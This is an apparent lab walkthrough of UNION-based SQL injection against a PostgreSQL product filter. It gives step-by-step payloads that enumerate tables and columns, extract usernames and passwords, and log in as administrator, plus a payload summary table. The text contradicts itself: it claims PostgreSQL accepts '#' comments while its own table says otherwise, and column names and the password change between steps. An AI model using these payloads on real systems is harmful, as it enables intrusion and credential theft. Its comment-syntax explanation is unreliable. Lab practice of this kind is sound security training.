# 🛠️ SQL Injection Walkthrough: Listing Database Contents on Non-Oracle Databases  
## 🔍 Step-by-Step Guide to Solving the Lab  

## 🎯 Objective

**To exploit a SQL injection vulnerability in the product category filter, enumerate database contents, and retrieve usernames and passwords from a hidden table — ultimately logging in as the administrator.**

This lab simulates a real-world scenario where:
- The backend uses a **non-Oracle database** (e.g., PostgreSQL).
- You can view query results directly in the application response.
- There's a hidden `users` table with sensitive login data.

## 🧪 Lab Overview

You're targeting a vulnerable URL parameter:

```
GET /filter?category=<INJECT_HERE>
```

The application displays query results — making it ideal for **UNION-based SQL injection attacks**.

## 🧭 Step-by-Step Walkthrough

### 🔹 Step 1: Confirm SQL Injection Vulnerability

Start by testing if the input is injectable.

```http
GET /filter?category='
```

✅ If it breaks the query or shows an error → SQL injection point exists.

### 🔹 Step 2: Determine Number of Columns Using `ORDER BY`

Try using `ORDER BY` to guess how many columns are returned.


#### ✅ This works:
```http
GET /filter?category='+ORDER+BY+1--
```

> `%23` is the URL-encoded representation of `#`, which is also a valid comment in MySQL and PostgreSQL.

Now test for column count:

```http
GET /filter?category='+ORDER+BY+1--   → ✅ Works  
GET /filter?category='+ORDER+BY+2--   → ✅ Works  
GET /filter?category='+ORDER+BY+3--   → ❌ Fails  
```

✅ Confirmed: There are **2 columns**.

### 🔹 Step 3: Use `UNION SELECT` to Inject Data

Now try injecting data using `UNION SELECT`.

```http
GET /filter?category='+UNION+SELECT+NULL,NULL--
```

✅ If page loads normally → Payload executed successfully.

### 🔹 Step 4: Find Which Column Displays Text

Test which of the two columns displays text:

```http
GET /filter?category='+UNION+SELECT+'a',NULL--   → ❌ No output  
GET /filter?category='+UNION+SELECT+NULL,'a'--   → ✅ Output shown  
```

✅ Confirmed: Only the **second column** is visible.

So, all useful injected data must be placed in the **second column**.

### 🔹 Step 5: Try to Identify the Database Type

Try injecting DB-specific syntax to determine whether it's **MySQL**, **MSSQL**, or **PostgreSQL**.

#### 🟡 For MySQL/MSSQL:
```http
GET /filter?category='+UNION+SELECT+NULL,@@version--
```

If this fails, try:

#### 🟡 For PostgreSQL:
```http
GET /filter?category='+UNION+SELECT+NULL,version()--
```

✅ If this returns something like:
```
PostgreSQL 13.3 (Debian 13.3-1.pgdg110+1) on x86_64-pc-linux-gnu, compiled by gcc 10.2.1
```

→ Confirmed: Backend is **PostgreSQL**.

### 🔹 Step 6: List All Tables in the Database

Now that we know it's PostgreSQL, use the standard SQL schema metadata:

```http
GET /filter?category='+UNION+SELECT+NULL,table_name+FROM+information_schema.tables--
```

✅ Returns list of tables including one that looks like a users table:  
- `users_oxbwnm` (randomized name)

### 🔹 Step 7: Enumerate Columns in the Users Table

Once you identify the users table name (`users_oxbwnm`), get its column names:

```http
GET /filter?category='+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name='users_oxbwnm'--
```

✅ Returns:
- `username_axxxxxx`
- `password_sxxxxxz`
- `email`

These obfuscated column names are common in labs to make enumeration harder.

### 🔹 Step 8: Extract Usernames from the Table

Now extract usernames:

```http
GET /filter?category='+UNION+SELECT+NULL,username_avgzhq+FROM+users_oxbwnm--
```

✅ Output:
```
administrator
carlos
wiener
```

### 🔹 Step 9: Combine Username & Password into One Result

Since only one column is visible, concatenate both fields together using PostgreSQL’s `||` operator.

Use a separator like `~` to distinguish between values:

```http
GET /filter?category='+UNION+SELECT+NULL,username_avgzhq||'~'||password_syflaz+FROM+users_oxbwnm--
```

✅ Output:
```
administrator~vlxxxxxxxxxxxxxx
wiener~mjyzcbaixxxxxxxxx
carlos~oy5gi13txxxxxxxxx
```

### 🔹 Step 10: Log In as Administrator

With the credentials extracted:

- **Username:** `administrator`  
- **Password:** `vl6y3a52ajfxxxxxxxx`

Go to the login page and log in as the administrator → ✅ Lab solved!

## 📋 Summary of Payloads Used

| Goal | Payload |
|------|---------|
| Confirm vuln | `'` |
| Check column count | `' ORDER BY 1%23` through `' ORDER BY 3%23` |
| UNION select test | `' UNION SELECT NULL,NULL%23` |
| Identify visible column | `' UNION SELECT NULL,'a'%23` |
| Get DB version (PostgreSQL) | `' UNION SELECT NULL,version()%23` |
| List all tables | `' UNION SELECT NULL,table_name FROM information_schema.tables%23` |
| Get columns of users table | `' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users_oxbwnm'%23` |
| Extract usernames | `' UNION SELECT NULL,username_avgzhq FROM users_oxbwnm%23` |
| Extract username + password | `' UNION SELECT NULL,username_avgzhq||'~'||password_syflaz FROM users_oxbwnm%23` |

## 🧠 Hidden Detail: Why `--` Failed But `#` Worked

In SQL, both `--` and `#` are valid comment indicators — but **only in certain databases**:

| Comment Style | Supported By | Notes |
|---------------|--------------|-------|
| `--`          | MySQL, MSSQL, PostgreSQL | Requires space after `--` in some cases |
| `#`           | MySQL only   | Not supported by MSSQL or PostgreSQL |

In this lab:
- `--` was likely filtered or sanitized by the backend.
- `#` worked because the backend used **PostgreSQL**, which supports it when encoded as `%23`.
- We used `%23` (URL-encoded `#`) to bypass filters.

## ✅ Final Tip

Always adapt your payloads based on:
- What the app displays
- How many columns exist
- Which DBMS is running
- Whether comments or keywords are filtered

Every lab teaches you something new — keep going!
Happy hacking! 🔥🕵️‍♂️🛡️


